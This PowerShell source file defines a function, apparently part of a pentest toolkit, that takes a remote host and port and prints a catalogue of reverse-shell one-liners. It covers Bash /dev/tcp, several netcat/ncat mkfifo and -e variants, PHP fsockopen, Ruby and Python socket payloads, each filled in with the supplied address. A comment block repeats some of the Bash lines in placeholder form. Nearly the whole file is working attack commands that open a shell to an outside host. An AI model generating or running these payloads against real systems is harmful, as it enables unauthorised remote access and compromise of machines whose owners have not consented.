Function Global:InvokeWPS-RSG()
{
    param
    (
    [String] $RHost,
    [String] $RPort
    )


#TODO
<#

Example of building these into hashtables - to return powershell-esque results

$Linux_RevShells = 
@{
    Bash = 
    'bash -i >& /dev/tcp/$RHost/$RPort 0>&1',
    '0<&196;exec 196<>/dev/tcp/$RHost/$RPort; sh <&196 >&196 2>&196'


    Netcat   = 
    'example 1',
    'example 2'

    Python  = 
    'example reverse shell 1',
    'some content',
    'etc'
}

$Windows_RevShells = 
@{
    PowerShell = 
    'powershell.exe -magic blah',
    'some other command'

    Python   = 
    'example 1',
    'example 2'

    Perl  = 
    'example reverse shell 1',
    'some content',
    'etc'
}

Example execution for result: 
Powershell.exe #> Windows_RevShells.Python
[0]> example 1
[1]> example 2

#>


    if($RHost -and $RPort)
    {
        Write-Host "--------------------------------------------------------------------------------------------------------------------------" -ForegroundColor Black

        # Bash Reverse Shells
        Write-Host  "[+] Bash Reverse Shells: "                                                                                                 -ForegroundColor Green
        Write-Host  "-[>] bash -i >& /dev/tcp/$RHost/$RPort 0>&1: "                                                                             -ForegroundColor Gray
        Write-Host  "-[>] 0<&196;exec 196<>/dev/tcp/$RHost/$RPort; sh <&196 >&196 2>&196 "                                                      -ForegroundColor Gray
        Write-Host  "-[>] exec 5<> /dev/tcp/$RHost/$RPort; cat <&5 | while read line; do $line 2>&5>&5; done "                                  -ForegroundColor Gray

        # Netcat Reverse Shells
        Write-Host  "[+] Netcat Reverse Shells: "                                                                                               -ForegroundColor Green
        Write-Host  "-[>] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $RHost $RPort >/tmp/f "                                         -ForegroundColor Gray
        Write-Host  "-[>] rm -f /tmp/p; mknod /tmp/p p && nc $RHost $RPort 0/tmp/p "                                                            -ForegroundColor Gray
        Write-Host  "-[>] nc -c /bin/sh $RHost $RPort "                                                                                         -ForegroundColor Gray
        Write-Host  "-[>] nc -e /bin/sh $RHost $RPort "                                                                                         -ForegroundColor Gray
        Write-Host  "-[>] /bin/sh | nc $RHost $RPort "                                                                                          -ForegroundColor Gray
        Write-Host  "-[>] ncat $RHost $RPort -e /bin/sh "                                                                                       -ForegroundColor Gray

        # PHP Reverse Shells
        Write-Host  "[+] PHP Reverse Shells: "                                                                                                  -ForegroundColor Green
        Write-Host  "-[>] php -r '$sock=fsockopen(`"$RHost`",$RPort);exec(`"/bin/sh -i <&3 >&3 2>&3`");' "                                      -ForegroundColor Gray
        Write-Host  "-[>] php -r '$s=fsockopen(`"$RHost`",$RPort);shell_exec(`"/bin/sh -i <&3 >&3 2>&3`");' "                                   -ForegroundColor Gray
        Write-Host  "-[>] php -r '$s=fsockopen(`"$RHost`",$RPort);`/bin/sh -i <&3 >&3 2>&3`;' "                                                 -ForegroundColor Gray
        Write-Host  "-[>] php -r '$s=fsockopen(`"$RHost`",$RPort);system(`"/bin/sh -i <&3 >&3 2>&3`");' "                                       -ForegroundColor Gray
        Write-Host  "-[>] php -r '$s=fsockopen(`"$RHost`",$RPort);popen(`"/bin/sh -i <&3 >&3 2>&3`", `"r`");' "                                 -ForegroundColor Gray

        # Powershell Reverse Shells
        Write-Host  "[+] Powershell Reverse Shells: "                                                                                          -ForegroundColor Green
        Write-Host  "-[>] N/A "                                                                                                                -ForegroundColor Gray

        # Ruby Reverse Shells
        Write-Host  "[+] Ruby Reverse Shells: "                                                                                                 -ForegroundColor Green
        Write-Host  "-[>] ruby -rsocket -e'f=TCPSocket.open(`"$RHost`",$RPort).to_i;exec sprintf(`"/bin/sh -i <&%d >&%d 2>&%d`",f,f,f)' "       -ForegroundColor Gray
                                                                                                          
        # Python Reverse Shells
        Write-Host  "[+] Python Reverse Shells: "                                                                                               -ForegroundColor Green
        Write-Host  "-[>] python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((`"$RHost`",$RPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([`"/bin/sh`",`"-i`"]);'" -ForegroundColor Gray
        
        Write-Host "--------------------------------------------------------------------------------------------------------------------------" -ForegroundColor Black
    }
    else
    {
        Write-Host "[WPS] Invalid arguments. please select both Lhost and Rhost ARGS" -ForegroundColor DarkRed
    }
}
